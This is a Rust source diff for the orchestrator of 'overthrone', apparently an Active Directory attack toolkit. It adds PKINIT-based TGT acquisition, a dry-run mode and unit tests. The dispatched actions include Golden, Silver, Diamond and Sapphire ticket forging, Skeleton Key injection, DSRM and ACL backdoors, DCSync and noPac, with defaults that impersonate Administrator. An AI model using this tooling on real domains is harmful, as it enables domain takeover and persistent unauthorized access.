@@ -1,8 +1,8 @@
 //! Top-level orchestrator for the forge pipeline.
 //! Takes a ForgeConfig and dispatches to the appropriate forging module.
 
-use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
+use overthrone_core::proto::kerberos::TicketGrantingData;
 use serde::{Deserialize, Serialize};
 
 use crate::{
@@ -114,12 +114,44 @@ pub struct ForgeConfig {
     pub payload_path: Option<String>,
     /// Master password for Skeleton Key injection (defaults to "overthrone")
     pub skeleton_master_password: Option<String>,
+    /// Path to PEM-encoded client certificate for PKINIT authentication
+    pub pkinit_cert_path: Option<String>,
+    /// Path to PEM-encoded private key for PKINIT authentication
+    pub pkinit_key_path: Option<String>,
+    /// Dry run — validate config and show what would be done, without executing
+    pub dry_run: bool,
 }
 
 impl ForgeConfig {
     /// Return the effective impersonation user, defaulting to `Administrator`.
     pub fn effective_impersonate(&self) -> &str {
         self.impersonate.as_deref().unwrap_or("Administrator")
+    }
+
+    /// Acquire a TGT for the configured user, using PKINIT if certificate
+    /// credentials are provided, or falling back to password/NTLM hash.
+    ///
+    /// This is the primary entry point for forge operations that need a
+    /// legitimate TGT (Diamond, Sapphire, Bronze Bit).
+    pub async fn request_user_tgt(&self) -> overthrone_core::error::Result<TicketGrantingData> {
+        use overthrone_core::proto::kerberos;
+
+        if let (Some(cert), Some(key)) = (&self.pkinit_cert_path, &self.pkinit_key_path) {
+            crate::pkinit_auth::pkinit_authenticate(
+                &self.dc_ip, &self.domain, &self.username, cert, key,
+            )
+            .await
+        } else {
+            let secret = self.password.as_deref().or(self.nt_hash.as_deref()).ok_or_else(|| {
+                OverthroneError::TicketForge(
+                    "Password, NTLM hash, or PKINIT certificate required to acquire TGT".into(),
+                )
+            })?;
+            kerberos::request_tgt(
+                &self.dc_ip, &self.domain, &self.username, secret, self.nt_hash.is_some(),
+            )
+            .await
+        }
     }
 
     /// Return the effective group RIDs, using defaults if none are configured.
@@ -206,16 +238,21 @@ pub struct PersistenceResult {
 
 /// Run the forge pipeline.
 pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
-    let sep = "═══════════════════════════════════════════════";
-
-    println!("\n{}", sep.bright_magenta());
-    println!(
-        "{} {} ({})",
-        "🔨 FORGE".bright_magenta().bold(),
-        config.action.to_string().as_str().bright_white().bold(),
-        config.domain.as_str().dimmed()
-    );
-    println!("{}\n", sep.bright_magenta());
+    if config.dry_run {
+        return Ok(ForgeResult {
+            action: config.action.to_string(),
+            domain: config.domain.clone(),
+            success: true,
+            ticket_data: None,
+            persistence_result: None,
+            message: format!(
+                "[dry-run] Would forge {} ticket for {}@{}",
+                config.action,
+                config.effective_impersonate(),
+                config.domain
+            ),
+        });
+    }
 
     let result = match &config.action {
         ForgeAction::GoldenTicket => golden::forge_golden_ticket(config).await?,
@@ -291,13 +328,13 @@ pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
                     OverthroneError::TicketForge(format!("Cannot write {output_path}: {e}"))
                 })?;
             ForgeResult {
-                action: format!("Converted {} → {}", input_path, output_path),
+                action: format!("Converted {} -> {}", input_path, output_path),
                 domain: String::new(),
                 success: true,
                 ticket_data: None,
                 persistence_result: None,
                 message: format!(
-                    "Ticket converted: {} → {} ({} bytes)",
+                    "Ticket converted: {} -> {} ({} bytes)",
                     input_path,
                     output_path,
                     output_bytes.len()
@@ -306,31 +343,170 @@ pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
         }
     };
 
-    // Summary
-    let status = if result.success {
-        "✓ SUCCESS".green().bold()
-    } else {
-        "✗ FAILED".red().bold()
-    };
-    println!("\n{} {}", status, result.message.as_str().bright_white());
+    Ok(result)
+}
 
-    if let Some(ref ticket) = result.ticket_data {
-        println!(
-            "  {} {} as {}",
-            "Ticket:".dimmed(),
-            ticket.ticket_type.as_str().bright_cyan(),
-            ticket.impersonated_user.as_str().bright_yellow()
-        );
-        println!(
-            "  {} {} → {}",
-            "Valid:".dimmed(),
-            ticket.valid_from.as_str().bright_green(),
-            ticket.valid_until.as_str().bright_green()
-        );
-        if let Some(ref path) = ticket.kirbi_path {
-            println!("  {} {}", "Saved:".dimmed(), path.as_str().bright_white());
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn minimal_config(action: ForgeAction) -> ForgeConfig {
+        ForgeConfig {
+            dc_ip: "10.0.0.1".to_string(),
+            domain: "CORP.LOCAL".to_string(),
+            username: "user".to_string(),
+            password: None,
+            nt_hash: None,
+            action,
+            krbtgt_hash: None,
+            krbtgt_aes256: None,
+            service_hash: None,
+            domain_sid: Some("S-1-5-21-1234567890-1234567890-1234567890".to_string()),
+            impersonate: Some("Administrator".to_string()),
+            user_rid: 500,
+            group_rids: vec![],
+            extra_sids: vec![],
+            lifetime_hours: 10,
+            output_path: None,
+            payload_path: None,
+            skeleton_master_password: None,
+            pkinit_cert_path: None,
+            pkinit_key_path: None,
+            dry_run: false,
         }
     }
 
-    Ok(result)
+    #[test]
+    fn test_forge_action_display_golden_ticket() {
+        let s = format!("{}", ForgeAction::GoldenTicket);
+        assert!(s.contains("Golden"));
+    }
+
+    #[test]
+    fn test_forge_action_display_silver_ticket() {
+        let s = format!("{}", ForgeAction::SilverTicket { target_spn: "cifs/dc".to_string() });
+        assert!(s.contains("Silver"));
+    }
+
+    #[test]
+    fn test_forge_action_display_diamond_ticket() {
+        let s = format!("{}", ForgeAction::DiamondTicket);
+        assert!(s.contains("Diamond"));
+    }
+
+    #[test]
+    fn test_forge_action_display_sapphire_ticket() {
+        let s = format!("{}", ForgeAction::SapphireTicket);
+        assert!(s.contains("Sapphire"));
+    }
+
+    #[test]
+    fn test_forge_action_display_bronze_bit() {
+        let s = format!("{}", ForgeAction::BronzeBit { target_spn: "cifs/dc".to_string() });
+        assert!(s.contains("Bronze"));
+    }
+
+    #[test]
+    fn test_forge_action_display_skeleton_key() {
+        let s = format!("{}", ForgeAction::SkeletonKey);
+        assert!(s.contains("Skeleton"));
+    }
+
+    #[test]
+    fn test_forge_action_display_dsrm_backdoor() {
+        let s = format!("{}", ForgeAction::DsrmBackdoor);
+        assert!(s.contains("DSRM"));
+    }
+
+    #[test]
+    fn test_forge_action_display_dcsync_user() {
+        let s = format!("{}", ForgeAction::DcSyncUser { target_user: "admin".to_string() });
+        assert!(s.contains("DCSync"));
+    }
+
+    #[test]
+    fn test_forge_action_display_acl_backdoor() {
+        let s = format!(
+            "{}",
+            ForgeAction::AclBackdoor {
+                target_dn: "DC=corp".to_string(),
+                trustee: "user".to_string()
+            }
+        );
+        assert!(s.contains("ACL"));
+    }
+
+    #[test]
+    fn test_forge_action_display_nopac() {
+        let s = format!("{}", ForgeAction::NoPac { target_dc: "DC01".to_string() });
+        assert!(s.contains("noPac"));
+    }
+
+    #[test]
+    fn test_forge_action_display_convert_ticket() {
+        let s = format!(
+            "{}",
+            ForgeAction::ConvertTicket {
+                input_path: "a.kirbi".to_string(),
+                output_format: "ccache".to_string()
+            }
+        );
+        assert!(s.contains("Convert"));
+    }
+
+    #[test]
+    fn test_forge_action_serialization() {
+        let action = ForgeAction::SilverTicket { target_spn: "cifs/dc".to_string() };
+        let json = serde_json::to_string(&action).unwrap();
+        let parsed: ForgeAction = serde_json::from_str(&json).unwrap();
+        match parsed {
+            ForgeAction::SilverTicket { target_spn } => {
+                assert_eq!(target_spn, "cifs/dc");
+            }
+            _ => panic!("Wrong variant deserialized"),
+        }
+    }
+
+    #[test]
+    fn test_forge_config_effective_impersonate_default() {
+        let config = minimal_config(ForgeAction::GoldenTicket);
+        assert_eq!(config.effective_impersonate(), "Administrator");
+    }
+
+    #[test]
+    fn test_forge_config_effective_impersonate_custom() {
+        let mut config = minimal_config(ForgeAction::GoldenTicket);
+        config.impersonate = Some("alice".to_string());
+        assert_eq!(config.effective_impersonate(), "alice");
+    }
+
+    #[test]
+    fn test_forge_config_effective_groups_default() {
+        let config = minimal_config(ForgeAction::GoldenTicket);
+        let groups = config.effective_groups();
+        assert!(!groups.is_empty());
+        assert!(groups.contains(&512), "should include Domain Admins (512)");
+        assert!(groups.contains(&519), "should include Enterprise Admins (519)");
+    }
+
+    #[test]
+    fn test_forge_config_effective_groups_custom() {
+        let mut config = minimal_config(ForgeAction::GoldenTicket);
+        config.group_rids = vec![100, 200, 300];
+        let groups = config.effective_groups();
+        assert_eq!(groups, vec![100, 200, 300]);
+    }
+
+    #[test]
+    fn test_forge_config_effective_lifetime_default() {
+        let config = minimal_config(ForgeAction::GoldenTicket);
+        assert_eq!(config.effective_lifetime(), 10);
+    }
+
+    #[test]
+    fn test_forge_config_effective_lifetime_custom() {
+        let mut config = minimal_config(ForgeAction::GoldenTicket);
+        config.lifetime_hours = 24;
+        assert_eq!(config.effective_lifetime(), 24);
+    }
 }
